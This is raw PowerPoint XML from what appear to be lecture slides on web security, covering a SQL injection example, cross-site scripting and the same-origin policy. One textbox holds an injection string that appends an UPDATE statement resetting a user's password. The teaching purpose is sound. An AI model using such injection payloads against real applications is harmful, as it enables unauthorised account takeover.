          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="170933" y="2361178"/>
            <a:ext cx="530915"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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>XXX</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2193542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Picture 3.pn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0" y="1181658"/>
            <a:ext cx="3846264" cy="2160449"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A Web Application</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="Picture 2.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22779" y="1938857"/>
            <a:ext cx="6266991" cy="47312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3273582" y="6361984"/>
            <a:ext cx="5413218" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>Example from CSE7330 at SMU (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>lyle.smu.edu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>/~</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>mhd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0"/>
              <a:t>7330</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>f09/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0" err="1"/>
              <a:t>boyd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
              <a:t>.ppt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="99534" y="1754707"/>
            <a:ext cx="4852636"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ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>; UPDATE `login` SET `pass`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>12345</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t> WHERE `user`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>David14</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>--</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Calisto MT" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="170933" y="2361178"/>
            <a:ext cx="530915" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C5D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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>XXX</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="377955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Cross-Site Scripting (XSS)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A scripting vulnerability that enables attackers to bypass the same origin policy of browsers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XSS vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Twitter</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Facebook</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MySpace</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>YouTube</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Orkut</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>……</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28410949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Same-Origin Policy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="6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sz="2600" dirty="0">
              <a:latin typeface="Arial" charset="0"/>
              <a:cs typeface="Arial" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="6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3000" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>One webpage can only read properties of another webpage if they share the same </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3000" u="sng" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3000" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3000" u="sng" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>protocol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3000" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="3000" u="sng" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>port</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:spcBef>
                <a:spcPts val="6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sz="2600" u="sng" dirty="0">
              <a:latin typeface="Arial" charset="0"/>
              <a:ea typeface="Arial" charset="0"/>
              <a:cs typeface="Arial" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="6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3000" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>If the same server hosts unrelated sites, scripts from one site can access document properties on the other</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37158438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Same-Origin Policy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1291976"/>
            <a:ext cx="8229600" cy="1087520"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" lvl="1" indent="-342900">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="2600" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>One webpage can only read properties of another webpage if they share the same </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2600" u="sng" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2600" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2600" u="sng" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>protocol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2600" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2600" u="sng" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>port</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="chromebeatsfiref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0431" y="2790063"/>
            <a:ext cx="2293321" cy="1627518"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="chromebeatsfiref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6999" y="2962021"/>
            <a:ext cx="2288875" cy="1624363"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="242176" y="2445389"/>
            <a:ext cx="3875730" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>www.example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>test.html</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="diag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1828" y="4586384"/>
            <a:ext cx="5942172" cy="2091728"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="11" name="Group 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3748223" y="2106681"/>
            <a:ext cx="2415545" cy="913921"/>
            <a:chOff x="3748223" y="2106681"/>
            <a:chExt cx="2415545" cy="913921"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Freeform 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3748223" y="2106681"/>
              <a:ext cx="2059057" cy="913921"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="connsiteX0" fmla="*/ 0 w 2059057"/>
                <a:gd name="connsiteY0" fmla="*/ 322130 h 913921"/>
                <a:gd name="connsiteX1" fmla="*/ 727451 w 2059057"/>
                <a:gd name="connsiteY1" fmla="*/ 26234 h 913921"/>
                <a:gd name="connsiteX2" fmla="*/ 2059057 w 2059057"/>
                <a:gd name="connsiteY2" fmla="*/ 913921 h 913921"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="0">
                  <a:pos x="connsiteX0" y="connsiteY0"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="connsiteX1" y="connsiteY1"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="connsiteX2" y="connsiteY2"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2059057" h="913921">
                  <a:moveTo>
                    <a:pt x="0" y="322130"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="192137" y="124866"/>
                    <a:pt x="384275" y="-72398"/>
                    <a:pt x="727451" y="26234"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="1070627" y="124866"/>
                    <a:pt x="2059057" y="913921"/>
                    <a:pt x="2059057" y="913921"/>
                  </a:cubicBezTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln>
              <a:tailEnd type="arrow"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Rectangle 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5182911" y="2203531"/>
              <a:ext cx="980857" cy="369332"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Corbel" charset="0"/>
                </a:rPr>
                <a:t>ACCESS</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5967358" y="4586384"/>
            <a:ext cx="3164312" cy="209172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493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Same-Origin Policy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1291976"/>
            <a:ext cx="8229600" cy="1087520"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" lvl="1" indent="-342900">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="2600" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>One webpage can only read properties of another webpage if they share the same </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2600" u="sng" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2600" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2600" u="sng" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>protocol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2600" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2600" u="sng" dirty="0">
                <a:latin typeface="Arial" charset="0"/>
                <a:ea typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>port</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="chromebeatsfiref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0431" y="2790063"/>
            <a:ext cx="2293321" cy="1627518"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="chromebeatsfiref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6999" y="2962021"/>
            <a:ext cx="2288875" cy="1624363"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="242176" y="2445389"/>
            <a:ext cx="3875730" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>www.example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Corbel" charset="0"/>
              </a:rPr>
              <a:t>test.html</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="diag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1828" y="4586384"/>
            <a:ext cx="5942172" cy="2091728"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="11" name="Group 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3748223" y="2106681"/>
            <a:ext cx="2415545" cy="913921"/>
            <a:chOff x="3748223" y="2106681"/>
            <a:chExt cx="2415545" cy="913921"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Freeform 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3748223" y="2106681"/>
              <a:ext cx="2059057" cy="913921"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="connsiteX0" fmla="*/ 0 w 2059057"/>
                <a:gd name="connsiteY0" fmla="*/ 322130 h 913921"/>
                <a:gd name="connsiteX1" fmla="*/ 727451 w 2059057"/>
                <a:gd name="connsiteY1" fmla="*/ 26234 h 913921"/>
                <a:gd name="connsiteX2" fmla="*/ 2059057 w 2059057"/>
                <a:gd name="connsiteY2" fmla="*/ 913921 h 913921"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="0">
                  <a:pos x="connsiteX0" y="connsiteY0"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="connsiteX1" y="connsiteY1"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="connsiteX2" y="connsiteY2"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2059057" h="913921">
                  <a:moveTo>
                    <a:pt x="0" y="322130"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="192137" y="124866"/>
                    <a:pt x="384275" y="-72398"/>
                    <a:pt x="727451" y="26234"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="1070627" y="124866"/>
                    <a:pt x="2059057" y="913921"/>
                    <a:pt x="2059057" y="913921"/>
                  </a:cubicBezTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln>
              <a:tailEnd type="arrow"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Rectangle 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5182911" y="2203531"/>
              <a:ext cx="980857" cy="369332"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0">
                  <a:latin typeface="Corbel" charset="0"/>
                </a:rPr>
                <a:t>ACCESS</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2348224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Same-Origin Policy</a:t>
            </a:r>
          </a:p>
